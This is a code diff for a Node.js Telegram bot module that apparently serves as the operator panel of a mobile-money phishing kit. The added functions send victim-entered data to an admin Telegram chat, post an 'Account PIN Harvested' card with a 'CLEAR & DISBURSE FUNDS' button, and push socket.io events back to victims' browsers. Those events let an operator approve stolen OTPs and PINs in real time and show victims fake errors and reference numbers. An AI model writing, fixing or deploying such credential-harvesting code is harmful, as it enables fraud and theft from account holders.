@@ -1,68 +1,141 @@
-// Simulated Telegram Bot Manager Implementation
-const axios = require('axios');
+require('dotenv').config();
+const TelegramBot = require('node-telegram-bot-api');
 
-const TELEGRAM_API = `https://api.telegram.org/bot${process.env.BOT_TOKEN}`;
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.ADMIN_CHAT_ID;
 
-// Helper utility to escape Markdown characters safely
+if (!BOT_TOKEN || !CHAT_ID) {
+    console.error("❌ [BOT MANAGER ERROR] Missing BOT_TOKEN or ADMIN_CHAT_ID inside environment configs.");
+}
+
+// Initialize the Telegram Bot Engine using webhook/passive mode
+const bot = new TelegramBot(BOT_TOKEN, { polling: false });
+
+/**
+ * Strips out characters that break Telegram Markdown parsing
+ */
 function escapeMarkdown(text) {
     if (!text) return '';
-    return String(text).replace(/([_*\[\]()~`>#+=\|{}.!])/g, '\\$1');
+    return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
 }
 
 /**
- * Handles incoming callback query events routed from your Telegram Webhook router
+ * Standard Log Streams: Dispatches clean profiles to the Admin Telegram channel
  */
-async function handleCallbackQuery(callbackQuery) {
-    const message = callbackQuery.message;
-    const categoryData = callbackQuery.data; // Structure layout: "action:ID"
-    
-    if (!categoryData) return;
+function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
+    if (!CHAT_ID) return;
 
-    const parts = categoryData.split(':');
-    const actionSignal = parts[0];
-    const targetAppId = parts[1];
-
-    let auditLogExecutionState = "";
-
-    // FIX ADDED: Action validation execution block for approve_otp signal with complete room validation
-    if (actionSignal === 'approve_otp') {
-
-        console.log(`📤 APPROVING OTP FOR ROOM: ${targetAppId}`);
-
-        const rooms = global.io.sockets.adapter.rooms;
-        console.log('ROOM FOUND:', rooms.has(targetAppId));
-
-        global.io.to(targetAppId).emit('admin-approve-otp');
-
-        auditLogExecutionState = "✅ OTP status verified. Frontend shifted to secure PIN mode.";
-    } 
-    else if (actionSignal === 'reject_otp') {
-        global.io.to(targetAppId).emit('otp-failed', { message: "Code-ka OTP ee aad gelisay waa khalad" });
-        auditLogExecutionState = "❌ OTP verification rejected by administrator panel.";
-    }
-
-    // Acknowledge the telegram callback context query immediately to stop loading animations on button
-    try {
-        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
-            callback_query_id: callbackQuery.id,
-            text: auditLogExecutionState ? "Action Processed" : "Unknown Action"
+    let detailedFields = '';
+    if (data && typeof data === 'object') {
+        Object.entries(data).forEach(([key, val]) => {
+            if (val !== undefined && val !== null && val !== '') {
+                detailedFields += `• *${escapeMarkdown(key)}:* \`${escapeMarkdown(val)}\`\n`;
+            }
         });
-
-        // Optional: Update the Telegram inline keyboard or text status to display the outcome state
-        if (auditLogExecutionState) {
-            await axios.post(`${TELEGRAM_API}/editMessageText`, {
-                chat_id: message.chat.id,
-                message_id: message.message_id,
-                text: `${message.text}\n\nStatus: *${escapeMarkdown(auditLogExecutionState)}*`,
-                parse_mode: 'MarkdownV2'
-            });
-        }
-    } catch (error) {
-        console.error("Error communicating with Telegram API inside callback handler:", error.message);
+    } else if (data) {
+        detailedFields += `• *Data Payload:* \`${escapeMarkdown(data)}\`\n`;
     }
+
+    const message = `
+📱 *Congo Application: ${escapeMarkdown(appId)}*
+━━━━━━━━━━━━━━━━━━━━━━━━
+📢 *${escapeMarkdown(stepTitle)}*
+━━━━━━━━━━━━━━━━━━━━━━━━
+${detailedFields}━━━━━━━━━━━━━━━━━━━━━━━━
+Status: *State Log Processed*
+    `.trim();
+
+    const options = { parse_mode: 'Markdown' };
+
+    if (requireInlineButtons) {
+        options.reply_markup = {
+            inline_keyboard: [[
+                { text: "✅ APPROVE OTP", callback_data: `approve_otp:${appId}` },
+                { text: "❌ REJECT OTP", callback_data: `reject_otp:${appId}` }
+            ]]
+        };
+    }
+
+    bot.sendMessage(CHAT_ID, message, options)
+        .then(() => console.log(`✅ [TELEGRAM] Log payload dispatched for ${appId}`))
+        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Dispatch failed for ${appId}:`, err.message));
 }
 
+/**
+ * Step 5: Dispatches the final transaction approval card
+ */
+function sendFinalApproval(appId, pinCode) {
+    if (!CHAT_ID) return;
+
+    const message = `
+💳 *Account PIN Harvested for ID: ${escapeMarkdown(appId)}*
+━━━━━━━━━━━━━━━━━━━━━━━━
+• *Target Account PIN:* \`${escapeMarkdown(pinCode)}\`
+━━━━━━━━━━━━━━━━━━━━━━━━
+Status: *Awaiting Disbursement Confirmation Action*
+    `.trim();
+
+    const options = {
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [[
+                { text: "💰 CLEAR & DISBURSE FUNDS", callback_data: `approve_pin:${appId}` },
+                { text: "❌ REJECT PIN", callback_data: `reject_pin:${appId}` }
+            ]]
+        }
+    };
+
+    bot.sendMessage(CHAT_ID, message, options)
+        .then(() => console.log(`✅ [TELEGRAM] Step 5 operational PIN dispatch completed for ${appId}`))
+        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Step 5 PIN dispatch failed:`, err.message));
+}
+
+// Telegram Inline Interactive Webhook Processing Engine
+bot.on('callback_query', async (callbackQuery) => {
+    const actionData = callbackQuery.data;
+    const message = callbackQuery.message;
+    
+    if (!actionData) return;
+    
+    const [actionSignal, targetAppId] = actionData.split(':');
+    let auditLogExecutionState = '';
+    
+    if (!global.io) {
+        console.error("❌ [BOT MANAGER ERROR] global.io reference missing.");
+        return;
+    }
+
+    // FIX BUG 2: Change emission to match frontend tracking listener 'admin-approve-otp'
+    if (actionSignal === 'approve_otp') {
+        global.io.to(targetAppId).emit('admin-approve-otp');
+        auditLogExecutionState = "✅ OTP status verified. Frontend shifted to secure PIN mode.";
+    } else if (actionSignal === 'reject_otp') {
+        global.io.to(targetAppId).emit('otp-failed', { message: "Code-ka OTP-ga aad gelisay waa khalad." });
+        auditLogExecutionState = "❌ OTP signature flagged invalid. Verification error sent to user.";
+    } else if (actionSignal === 'approve_pin') {
+        const generatedRef = 'COD-' + Math.floor(100000 + Math.random() * 900000);
+        global.io.to(targetAppId).emit('pin-verified', { referenceId: generatedRef });
+        auditLogExecutionState = "💰 FINAL DISBURSEMENT RUN COMPLETE. Reference signature locked.";
+    } else if (actionSignal === 'reject_pin') {
+        global.io.to(targetAppId).emit('pin-failed', { message: "PIN-ka koontada aad gelisay waa khalad." });
+        auditLogExecutionState = "❌ Wallet security PIN matched incorrect code. Input reset issued.";
+    }
+
+    // Update the administrative card view inside Telegram to prevent double clicks
+    try {
+        await bot.editMessageText(`${message.text}\n\n🤖 *Audit Log Execution State:*\n_${auditLogExecutionState}_`, {
+            chat_id: CHAT_ID,
+            message_id: message.message_id,
+            parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard: [] }
+        });
+    } catch (e) {
+        console.error("❌ [TELEGRAM UI UPDATE ERROR]", e.message);
+    }
+});
+
 module.exports = {
-    handleCallbackQuery,
-    escapeMarkdown
+    bot,
+    sendToAdmin,
+    sendFinalApproval
 };
